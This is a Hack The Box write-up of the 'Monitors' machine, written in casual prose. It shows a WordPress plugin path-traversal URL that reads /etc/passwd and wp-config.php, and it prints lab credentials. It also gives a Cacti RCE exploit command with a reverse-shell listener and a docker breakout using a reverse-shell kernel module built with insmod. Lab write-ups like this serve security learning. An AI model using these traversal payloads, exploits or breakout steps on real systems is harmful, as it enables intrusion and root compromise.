```

let's see version is 5.5.1 and it's a old version let's see what we can use....
next let's try to get foothold...
# user

so i got a username admin..
besides i got no other username....
i go to wp-admin..
![3](/assets/images/htb/hard/monitor/3.png)
well using that and a random password...
i got
![4](/assets/images/htb/hard/monitor/4.png)

so i gonna first try with this....
`WP with Spritz 1.0 - Unauthenticated File Inclusion`

and see what we got...
![5](/assets/images/htb/hard/monitor/5.png)

upon visiting mention page well page is there...
well it's working and we got /etc/passwd...
![6](/assets/images/htb/hard/monitor/6.png)

and we got username....
`marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash`
username: marcus

there is one more there to visit webpage...
so i try to upload and think while loading maybe we can get shell...
but instead we got whole php page as data....
![7](/assets/images/htb/hard/monitor/7.png)

well i can't find index.php for website because i don't know by which is in there....
because /var/www/html is document but i can't there is nothing which match wordpress or either default....
so i download exact version of wordpress and see file structure....
and forlder name for wordpress is `wordpress`
so if it's default install and some setup then wordpress folder must be ..... 
`wordpress/`

let's test...
first i try...
```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//var/www/html/wordpress/index.php
```
but nothing...
so i try...
```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//var/www/wordpress/index.php
```
and it's return something
![8](/assets/images/htb/hard/monitor/8.png)

so i match file data with downloaded index.php and it's same so i am inside wordpress....
let's search for creds....

and was able to find that creds related is into wp-config.php and was able to retrive it....
![9](/assets/images/htb/hard/monitor/9.png)

```


these creds are pure for database...
because i try to check it on wp-admin and got ...
![10](/assets/images/htb/hard/monitor/10.png)

so i run a lfi using burp by using seclist/fuzzing/lfi/LFI-LFISuite-pathtotest.txt i got a log file..which is related to apache....
but...
![12](/assets/images/htb/hard/monitor/12.png)

this is something i didn't expect....
/conti but upon visiting i can't access it...

and so i check /etc/hosts...
```

127.0.0.1 localhost
127.0.1.1 monitors

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

there is just monitor written.... 

so i search online /cacti
and found out that this is a monitoring tool.....
![13](/assets/images/htb/hard/monitor/13.png)
so i need to found that where it is running?...
i go to cacti documentations and read about it...
how and how to do anyhting.... 

/var/www/html/cacti...
let's test it ...
but didn't work....
well i can't seem to find anything now......
i head back to forum where they are saying to look file carefully otherwise you will miss something...
well i already wasted 2 hour here...
but lastly i found out my mistake....
it's 000-default.conf
i didn't read it carefully...
because in top there domain names.....
![14](/assets/images/htb/hard/monitor/14.png)

```
cacti-admin.monitors.htb
```

let's add and go there.....

got another login page...
![15](/assets/images/htb/hard/monitor/15.png)

but i already know about it.....
and we also got version...
`1.2.12`

and upon searching for exploit online i found remote code execution in this version......
```
https://www.exploit-db.com/exploits/49810
```
![16](/assets/images/htb/hard/monitor/16.png)

let's try...
but we needs creds for this.....
let's see if last creds which we find, we can use it here...
well using wpadmin we can't log in ..... but i tried also admin and ....
i use admin here because that's also into system administrator mail.....
we got logged in....
![17](/assets/images/htb/hard/monitor/17.png)

username: admin
password: BestAdministrator@2020!
let's use this.....
and run our script.....
```
python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.16.88 --lport 4444
```

# www-data

script run successfully.....
![19](/assets/images/htb/hard/monitor/19.png)
and got 2 hash......

and we got shell as www-data...
well there is no curl and wget so i use nc to download file.....

```
GET /linpeas.sh HTTP/1.1
Host: 10.10.16.88:5555
User-Agent: netcat
```
after that i run and note impotant things....

well when i wordpress and mysql i remember that we wasn't able to login into it....
so i use mysql to connect and and new creds.....

![21](/assets/images/htb/hard/monitor/21.png)

user: admin
hash: $P$Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0

let's decrypt it....
but it's taing long time so search something else.....

inside marcus home ...
```
www-data@monitors:/home/marcus$ ls -al
ls -al
total 44
drwxr-xr-x 5 marcus marcus 4096 Sep 22 07:19 .
drwxr-xr-x 3 root   root   4096 Nov 10  2020 ..

www-data@monitors:/home/marcus$ 
```

this .backup folder we can run it but can't read or write....
i need to findout what is in that folder.....
but no luck so i once again looking through result of linpeas....
this pick my interest because of .backup folder
```
[+] Searching backup-manager files
backup-manager file: /usr/share/cacti/cacti/lib/database.php 
```

this means there is a backup manager here...
only then that backup can be done...
let's see what we can find.....
```
www-data@monitors:/usr/share/cacti/cacti$ wc -l /usr/share/cacti/cacti/lib/database.php
ase.phpusr/share/cacti/cacti/lib/databa
1587 /usr/share/cacti/cacti/lib/database.php
www-data@monitors:/usr/share/cacti/cacti$ 
```
let's search keyword backup in that file...
```
www-data@monitors:/usr/share/cacti/cacti$ cat /usr/share/cacti/cacti/lib/database.php | grep 'backup'.php | grep 'backup'cacti/lib/database
```

nothing related backup...
let's search cacti directory...
one file must have backup related data......

but i wasn't able to find anything related backup in /usr/share/cacti ....
so let's search other folders......

like /etc, /opt....
```
grep -irl ".backup" /etc 2> /dev/null

grep -ir "marcus" /etc 2> /dev/null
grep -r "marcus" / 2> /dev/null

grep -R "marcus" /etc 2> /dev/null

```

after sevral try i find out...
![22](/assets/images/htb/hard/monitor/22.png)

so i check for permission....
```
www-data@monitors:/var/www$ ls -al /etc/systemd/system/cacti-backup.service
ls -al /etc/systemd/system/cacti-backup.service
lrwxrwxrwx 1 root root 40 Nov 10  2020 /etc/systemd/system/cacti-backup.service -> /lib/systemd/system/cacti-backup.service
www-data@monitors:/var/www$ 
```

we have full permission here.....
let's check and edit it....
as i check folder
```

drwxr-xr-x  5 root root 4096 Jul 23 13:45 ..

```

we have permission to write on many files....
so let's cacti-backup.service.......
upon checking i was able to find a file inside directory...
well can't list we can run it that is the permission so i can know what's in there....

![23](/assets/images/htb/hard/monitor/23.png)

got a ssh password,

password = VerticalEdge2020

well in we can see that it's a sshpass and running a scp with it.....

so let's try ssh with and see which user this is belong....
# marcus

we can ssh marcus with it.......
![24](/assets/images/htb/hard/monitor/24.png)

and got flag....
```
marcus@monitors:~$ cat user.txt
298955be102d30dd007ca9cd26d643ad
```

# root

on marcus home found a note.txt
```
marcus@monitors:~$ cat note.txt
TODO:

Disable phpinfo in php.ini              - DONE
Update docker image for production use  - 
```

so it's maybe related to docker....
and there is service running on port 8443 and also docker also running...
![25](/assets/images/htb/hard/monitor/25.png)

let's forward port using ssh and see what we got there.......
![26](/assets/images/htb/hard/monitor/26.png)

so i visit website....
and we got error page of tomcat.....
![27](/assets/images/htb/hard/monitor/27.png)

well i need to use metasploit because all exploit are for it....
so let's try then....
but with a single port it's not possible......
with this we also need other ports....
```
https://docs.openkm.com/kcenter/view/okm-6.4/configuring-tomcat-port.html
```

we got
```
<Connector address="0.0.0.0" connectionTimeout="20000" port="8080" protocol="HTTP/1.1" redirectPort="8443"/>
<Connector address="127.0.0.1" port="8009" protocol="AJP/1.3" redirectPort="8443"/>
```

as we can see we need 2 ports.....
8080 and 8443......
so i run a tunnel using ssh for ports....
![28](/assets/images/htb/hard/monitor/28.png)

and upon searcing online i found deserilization exploit and it's in metasploit
```
https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/
```
![34](/assets/images/htb/hard/monitor/34.png)

so i search in metasploit...
![29](/assets/images/htb/hard/monitor/29.png)

using this we get shell of root of docker....
![30](/assets/images/htb/hard/monitor/30.png)

we need to make sure properly make ssh tunnel otherwise it gonna make problems about port...
so i begin my search well what i need is get a shell from docker to make machine....
so upon searching online
```
https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
```
and raeding and testing `Container Capabilities`

i was able to confirmm i can use this for shell...
![31](/assets/images/htb/hard/monitor/31.png)
all permissions...

and from there we need to follow

`Example with environment (Docker breakout)`

![35](/assets/images/htb/hard/monitor/35.png)

so i download files from my local server....
and follow process as written...
well i am getting error here as my kernal version is showing different then system....
so i update Makefile to
```
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) modules
clean:
	make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) clean
```

and download and run it.....
![32](/assets/images/htb/hard/monitor/32.png)

and also run insmod for adding that into kernel....
and while a nc listener is already listening on marcus ssh....
so we got root shell....
![33](/assets/images/htb/hard/monitor/33.png)

and also got flag.....
```
root@monitors:/root# cat root.txt
cat root.txt
